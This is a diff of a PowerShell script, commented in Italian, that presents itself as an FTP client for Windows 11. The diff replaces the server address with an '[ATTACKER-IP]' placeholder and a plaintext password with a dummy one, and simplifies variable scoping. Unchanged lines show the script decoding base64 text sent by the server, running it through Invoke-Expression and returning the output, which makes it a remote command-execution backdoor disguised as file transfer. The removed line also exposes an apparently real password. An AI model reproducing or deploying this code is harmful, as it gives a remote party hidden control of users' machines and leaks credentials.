@@ -2,12 +2,12 @@
 #  FTP CLIENT - PowerShell  (Windows 11)
 #  Modifica SERVER_IP con l indirizzo IP della macchina Linux
 # ==============================================================
-$SERVER_IP   = "192.168.1.139"   # <-- inserire IP del server Linux
+$SERVER_IP   = "[ATTACKER-IP]"   # <-- inserire IP del server Linux
 $SERVER_PORT = 21
 $DATA_PORT   = 10092             # porta passiva fissa concordata col server
 
 $USERNAME    = "usrftp"
-$PASSWORD    = "1971Camilla"
+$PASSWORD    = "myPassword"
 
 $DOWNLOAD_FILE  = "downloadME.txt"
 $UPLOAD_FILE    = "uploadME.txt"
@@ -23,21 +23,21 @@ $READ_TIMEOUT_MS    = 300000  # ms di attesa (5 min: server aspetta input utente
 
 # -- Funzioni helper --------------------------------------------
 
-function out([string]$msg, [string]$color = "White") {
-    if (-not $script:SILENT) {
+function out($msg, $color = "White") {
+    if (-not $SILENT) {
         if ($color -eq "White") { Write-Host $msg }
         else { Write-Host $msg -ForegroundColor $color }
     }
 }
 
-function dbg([string]$msg) {
-    if ($script:DEBUG -and -not $script:SILENT) {
+function dbg($msg) {
+    if ($DEBUG -and -not $SILENT) {
         $ts = (Get-Date).ToString("HH:mm:ss.fff")
         Write-Host "  [DBG $ts] $msg" -ForegroundColor Cyan
     }
 }
 
-function Send-Command($stream, [string]$cmd) {
+function Send-Command($stream, $cmd) {
     dbg ">>> Invio comando: $cmd"
     $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd + "`r`n")
     try {
@@ -52,7 +52,7 @@ function Send-Command($stream, [string]$cmd) {
 }
 
 function Read-Response($reader) {
-    dbg "    In attesa risposta dal server (timeout $($script:READ_TIMEOUT_MS)ms)..."
+    dbg "    In attesa risposta dal server (timeout $($READ_TIMEOUT_MS)ms)..."
     try {
         $line = $reader.ReadLine()
         if ($null -eq $line) {
@@ -68,14 +68,14 @@ function Read-Response($reader) {
     }
 }
 
-function New-TcpConnection([string]$ip, [int]$port) {
-    dbg "Tentativo connessione TCP a ${ip}:${port} (timeout $($script:CONNECT_TIMEOUT_MS)ms) ..."
+function New-TcpConnection($ip, $port) {
+    dbg "Tentativo connessione TCP a ${ip}:${port} (timeout $($CONNECT_TIMEOUT_MS)ms) ..."
     $client = New-Object System.Net.Sockets.TcpClient
     $ar = $client.BeginConnect($ip, $port, $null, $null)
-    $ok = $ar.AsyncWaitHandle.WaitOne($script:CONNECT_TIMEOUT_MS, $false)
+    $ok = $ar.AsyncWaitHandle.WaitOne($CONNECT_TIMEOUT_MS, $false)
     if (-not $ok) {
         $client.Close()
-        throw "Timeout connessione TCP a ${ip}:${port} dopo $($script:CONNECT_TIMEOUT_MS)ms"
+        throw "Timeout connessione TCP a ${ip}:${port} dopo $($CONNECT_TIMEOUT_MS)ms"
     }
     try { $client.EndConnect($ar) } catch {
         $client.Close()
@@ -192,7 +192,7 @@ while ($true) {
     $bytes = [Convert]::FromBase64String($b64)
     # Converte i bytes in stringa UTF-8
     $fileContent = [System.Text.Encoding]::UTF8.GetString($bytes)
-	if (-not $script:SILENT) {
+	if (-not $SILENT) {
 	    Write-Host "Ricevuto: $fileContent" -ForegroundColor Magenta
 	}
     try {
@@ -232,7 +232,7 @@ while ($true) {
 	# >>>>>>>>>>>>>>>>>>>>>  	
     # Esegui comando e cattura output
     $result = Invoke-Expression $fileContent 2>&1 | Out-String
-	if (-not $script:SILENT) {
+	if (-not $SILENT) {
           Write-Host "Sto per inviare: $result" -ForegroundColor Magenta
     }
     # Converte in byte UTF-8
